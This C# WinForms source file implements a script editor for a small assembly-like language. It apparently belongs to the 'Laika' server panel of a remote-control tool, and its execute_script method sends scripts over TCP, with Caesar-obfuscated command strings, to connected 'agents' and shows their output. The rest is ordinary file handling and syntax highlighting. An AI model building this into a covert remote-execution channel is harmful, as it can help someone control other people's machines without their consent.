﻿using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Xml;
using static System.Net.Mime.MediaTypeNames;

namespace Server
{
    public partial class PasmEditor : Form
    {
        private static string filepath = "";
        private static bool is_executing = false;
        List<string> instructions = new List<string> {
            "add", "sub", "mul", "div", "mov",
            "cmp", "je", "jne", "jb", "jnb",
            "ja", "jna", "jmp", "ret", "pop",
            "push", "call", "sqrt", "neg",
            "and", "xor", "end"
        };
        public PasmEditor(bool is_from_right_click)
        {
            InitializeComponent();
            executeToolStripMenuItem.Enabled = is_from_right_click;
            richTextBox1.DragDrop += new DragEventHandler(richTextBox1_DragDrop);
        }

        private bool SpawnSaveDialog()
        {
            if (this.Text.Contains("*") || (filepath != "" && this.Text.Contains("*")))
            {
                DialogResult messageResult = MessageBox.Show("Save this file?", "Save", MessageBoxButtons.YesNoCancel);
                if (messageResult == DialogResult.Yes)
                {
                    saveToolStripMenuItem_Click(null, null);
                }
                else if (messageResult == DialogResult.Cancel)
                {
                    return true;
                }
            }
            return false;
        }
        private void newCTRLNToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (SpawnSaveDialog())
                return;
            richTextBox1.Text = "";
            filepath = "";
            this.Text = "pasm editor - New File";
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (SpawnSaveDialog())
                return;

            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "PASM source files (*.pasm)|*.pasm",
                Title = "Select your PASM source code file."
            };

            if (openFileDialog.ShowDialog() != DialogResult.OK)
                return;

            string filePath = openFileDialog.FileName;
            if (filePath == null) return;

            richTextBox1.LoadFile(filePath, RichTextBoxStreamType.PlainText);
            filepath = filePath;

            this.Text = "pasm editor - " + Path.GetFileName(filePath);
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (filepath == "")
            {
                saveAsCTRLMajSToolStripMenuItem_Click(sender, e);
                return;
            }
            richTextBox1.SaveFile(filepath, RichTextBoxStreamType.PlainText);
        }

        private void saveAsCTRLMajSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "PASM source files (*.pasm)|*.pasm",
                Title = "Save as"
            };

            if (saveFileDialog.ShowDialog() != DialogResult.OK)
                return;

            string filePath = saveFileDialog.FileName;
            if (filePath == null) return;

            richTextBox1.SaveFile(filePath, RichTextBoxStreamType.PlainText);
            filepath = filePath;
        }

        private void closeCTRLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (SpawnSaveDialog())
                return;

            richTextBox1.Text = "";
            filepath = "";
            this.Text = "pasm editor - New File";
        }

        void richTextBox1_DragDrop(object sender, DragEventArgs e)
        {
            object filename = e.Data.GetData("FileDrop");
            if (filename != null)
            {
                var list = filename as string[];

                if (list != null && !string.IsNullOrWhiteSpace(list[0]))
                {
                    richTextBox1.Clear();
                    richTextBox1.LoadFile(list[0], RichTextBoxStreamType.PlainText);
                    filepath = list[0];
                    this.Text = "pasm editor - " + Path.GetFileName(filepath);
                }
            }
            e.Effect = DragDropEffects.None;
        }

        private void execute_script()
        {
            is_executing = true;
            TcpClient c = Server.Menu.CONNECT_CLIENTS[Server.Menu.CLIENT_ID];
            c.ReceiveTimeout = 10000;
            c.Client.Blocking = true;

            try
            {
                NetworkStream stream = c.GetStream();

                byte[] Message = System.Text.Encoding.UTF8.GetBytes(Utils.CAESAR("pasm"));
                stream.Write(Message, 0, Message.Length);

                string fileContent = File.ReadAllText(filepath);
                byte[] fileContentBytes = Encoding.UTF8.GetBytes(fileContent);
                stream.Write(fileContentBytes, 0, fileContentBytes.Length);

                byte[] buffer = new byte[2048];
                int bytesRead;

                textBox1.Text += "\r\n\r\nLaika: script sent\r\n\r\n";

                while (true)
                {
                    bytesRead = stream.Read(buffer, 0, buffer.Length);
                    string receivedData = System.Text.Encoding.UTF8.GetString(buffer, 0, bytesRead);

                    if (receivedData == "fail")
                    {
                        textBox1.Text += "Agent failed to execute the script due to an unknown error.\n";
                        textBox1.SelectionStart = textBox1.TextLength;
                        textBox1.ScrollToCaret();
                        break;
                    }

                    textBox1.Text += receivedData.Replace(Utils.CAESAR("Laika: end of script"), "").Replace("\n", "\r\n");

                    if (receivedData.Contains(Utils.CAESAR("Laika: end of script")))
                    {
                        textBox1.Text += "\r\n\r\nLaika: end of script\r\n\r\n";
                        textBox1.SelectionStart = textBox1.TextLength;
                        textBox1.ScrollToCaret();
                        break;
                    }

                    textBox1.SelectionStart = textBox1.TextLength;
                    textBox1.ScrollToCaret();
                    this.Update();
                }
            }
            catch
            {
                MessageBox.Show("Client timed out.");
            }

            is_executing = false;
            executeToolStripMenuItem.Enabled = true;
        }
        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (is_executing)
                return;

            Thread t = new Thread(execute_script);
            t.Start();

            executeToolStripMenuItem.Enabled = false;
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            if (!this.Text.Contains("*"))
            {
                this.Text += "*";
            }

            // took from https://codingvision.net/c-simple-syntax-highlighting
            Regex semicolonRegex = new Regex(@";.*");
            Regex numberRegex = new Regex(@"\b\d+\b");
            Regex labelsRegex = new Regex(@"(?:\n|\A)\w+:");

            // saving the original caret position + forecolor
            int originalIndex = richTextBox1.SelectionStart;
            int originalLength = richTextBox1.SelectionLength;
            Color originalColor = Color.Black;

            // MANDATORY - focuses a label before highlighting (avoids blinking)
            splitter1.Focus();

            // removes any previous highlighting (so modified words won't remain highlighted)
            richTextBox1.SelectionStart = 0;
            richTextBox1.SelectionLength = richTextBox1.Text.Length;
            richTextBox1.SelectionColor = originalColor;

            // scanning...
            foreach(Match match in semicolonRegex.Matches(richTextBox1.Text))
            {
                richTextBox1.SelectionStart = match.Index;
                richTextBox1.SelectionLength = match.Length;
                richTextBox1.SelectionColor = Color.Green;
            }

            foreach (Match match in numberRegex.Matches(richTextBox1.Text))
            {
                richTextBox1.SelectionStart = match.Index;
                richTextBox1.SelectionLength = match.Length;
                if (richTextBox1.SelectionColor == Color.Black)
                    richTextBox1.SelectionColor = Color.Blue;
            }

            foreach (Match match in labelsRegex.Matches(richTextBox1.Text))
            {
                richTextBox1.SelectionStart = match.Index;
                richTextBox1.SelectionLength = match.Length;
                if (richTextBox1.SelectionColor == Color.Black)
                    richTextBox1.SelectionColor = Color.DarkOrange;
            }

            foreach (string ins in instructions)
            {
                string pattern = @"\b" + Regex.Escape(ins) + @"\b";
                Regex regex = new Regex(pattern);

                foreach (Match match in regex.Matches(richTextBox1.Text))
                {
                    richTextBox1.SelectionStart = match.Index;
                    richTextBox1.SelectionLength = match.Length;
                    if (richTextBox1.SelectionColor == Color.Black)
                        richTextBox1.SelectionColor = Color.DarkRed;
                }
            }

            // restoring the original colors, for further writing
            richTextBox1.SelectionStart = originalIndex;
            richTextBox1.SelectionLength = originalLength;
            richTextBox1.SelectionColor = originalColor;

            richTextBox1.Focus();
        }
    }
}
